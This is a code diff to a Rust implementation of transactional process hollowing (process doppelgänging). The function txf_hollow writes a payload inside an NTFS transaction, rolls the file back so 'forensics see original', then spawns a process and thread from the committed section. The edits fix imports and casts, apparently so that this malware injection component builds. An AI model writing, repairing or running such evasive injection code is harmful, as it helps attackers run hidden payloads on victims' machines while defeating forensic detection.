@@ -38,7 +38,7 @@ use ntapi::ntioapi::{NtCreateFile, NtWriteFile, FILE_OVERWRITE_IF, FILE_SYNCHRON
 #[cfg(windows)]
 use ntapi::ntmmapi::NtCreateSection;
 #[cfg(windows)]
-use ntapi::ntobapi::NtCreateTransaction;
+use ntapi::nttmapi::NtCreateTransaction;
 #[cfg(windows)]
 use ntapi::ntpsapi::{
     NtCreateProcessEx, NtCreateThreadEx, NtQueryInformationProcess,
@@ -284,7 +284,7 @@ pub fn txf_hollow(target_exe: &str, payload: &[u8]) -> Result<u32, KrakenError> 
     // ---- 5. NtRollbackTransaction — undo file write (forensics see original) ----
     // After rollback, on-disk file is restored; section object is already committed.
     let status = unsafe {
-        ntapi::ntobapi::NtRollbackTransaction(txn.as_raw() as *mut _, 1 /* Wait = TRUE */)
+        ntapi::nttmapi::NtRollbackTransaction(txn.as_raw() as *mut _, 1 /* Wait = TRUE */)
     };
     if !nt_success(status) {
         // Non-fatal: log and continue — section is already created
@@ -311,7 +311,7 @@ pub fn txf_hollow(target_exe: &str, payload: &[u8]) -> Result<u32, KrakenError> 
             &mut proc_handle_raw,
             ntapi::winapi::um::winnt::PROCESS_ALL_ACCESS,
             std::ptr::null_mut(),        // ObjectAttributes
-            ntapi::winapi::um::processthreadsapi::GetCurrentProcess(),
+            windows_sys::Win32::System::Threading::GetCurrentProcess() as *mut _,
             process_flags,
             section.as_raw() as *mut _, // SectionHandle
             std::ptr::null_mut(),        // DebugPort
@@ -534,7 +534,7 @@ pub fn txf_hollow(target_exe: &str, payload: &[u8]) -> Result<u32, KrakenError> 
             ntapi::winapi::um::winnt::THREAD_ALL_ACCESS,
             std::ptr::null_mut(),            // ObjectAttributes
             proc_handle.as_raw() as *mut _,
-            Some(std::mem::transmute(entry_point)), // StartRoutine
+            std::mem::transmute(entry_point), // StartRoutine
             std::ptr::null_mut(),            // Argument (peb address could go here)
             0,                               // CreateFlags (0 = not suspended)
             0,                               // ZeroBits
